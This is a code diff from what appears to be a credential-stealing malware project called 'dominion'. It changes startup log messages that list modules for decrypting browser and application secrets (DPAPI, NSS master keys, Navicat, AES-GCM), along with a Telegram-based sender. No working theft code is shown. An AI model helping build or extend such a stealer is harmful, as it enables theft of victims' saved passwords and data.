@@ -34,10 +34,12 @@ namespace dominion.src
                 RunSecurityChecks();
             }
 
-            LogSucess("Successfully initialized Src.Entry.cs");
-            LogSucess("Successfully initialized Src.Dominion.Configuration.Configuration.cs");
-            LogSucess("Successfully initialized Src.Dominion.Dependencies.Data.InMemmoryZip.cs");
-            LogSucess("Successfully initialized Src.Dominion.Dependencies.Data.Paths.cs");
+            // Main Modules
+            LogSucess("Successfully initialized Entry.cs");
+            LogSucess("Successfully initialized Configuration.cs");
+            LogSucess("Successfully initialized Counter.cs");
+            LogSucess("Successfully initialized InMemmoryZip.cs");
+            LogSucess("Successfully initialized Paths.cs");
 
             try
             {
@@ -49,6 +51,36 @@ namespace dominion.src
                 LogError("Issue with initializing telegram: " + ex.Message);
                 Console.WriteLine(ex);
             }
+
+            // Encryption
+            Console.WriteLine("");
+            LogSucess("Successfully initialized LocalState.cs");
+            LogSucess("Successfully initialized Asn1DerObject.cs");
+            LogSucess("Successfully initialized Asn1Der.cs");
+            LogSucess("Successfully initialized BlowFish.cs");
+            LogSucess("Successfully initialized DpApi.cs");
+            LogSucess("Successfully initialized Navicat11Cipher.cs");
+            LogSucess("Successfully initialized NSSDumpMasterKey.cs");
+            LogSucess("Successfully initialized NSSDecryption.cs");
+            LogSucess("Successfully initialized RC4Crypt.cs");
+            LogSucess("Successfully initialized TripleDes.cs");
+            LogSucess("Successfully initialized Xor.cs");
+            LogSucess("Successfully initialized AesGcm.cs");
+            LogSucess("Successfully initialized AesGcm256.cs");
+            LogSucess("Successfully initialized CngDecryptor.cs");
+            LogSucess("Successfully initialized YuAuthenticatedData.cs");
+            LogSucess("Successfully initialized LocalEncryptor.cs");
+            LogSucess("Successfully initialized LocalState.cs");
+
+            // Hashing
+            Console.WriteLine("");
+            LogSucess("Successfully initialized PBE.cs");
+            LogSucess("Successfully initialized PBKDF2.cs");
+
+            // Sql
+            Console.WriteLine("");
+            LogSucess("Successfully initialized BerkelyDB.cs");
+            LogSucess("Successfully initialized SqLite.cs");
 
             Console.ReadLine();
         }
@@ -91,7 +123,7 @@ namespace dominion.src
 
         private static async Task SendMessage()
         {
-            LogSucess("Successfully initialized Src.Dominion.Stealer.General.Sender.cs");
+            LogSucess("Successfully initialized Sender.cs");
             using (var sender = new Sender())
             {
                 await sender.SendHelloMessage();
